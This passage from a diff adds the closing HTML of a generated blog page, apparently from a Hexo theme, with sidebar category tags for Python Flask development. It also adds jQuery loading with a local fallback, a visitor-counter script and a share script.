+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="python-flask-开发"><span class="iconfont-archer">&#xe60a;</span>python-flask-开发</span>
+    
+        <span class="sidebar-category-name" data-categories="开发"><span class="iconfont-archer">&#xe60a;</span>开发</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "xiaomeiqiu"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
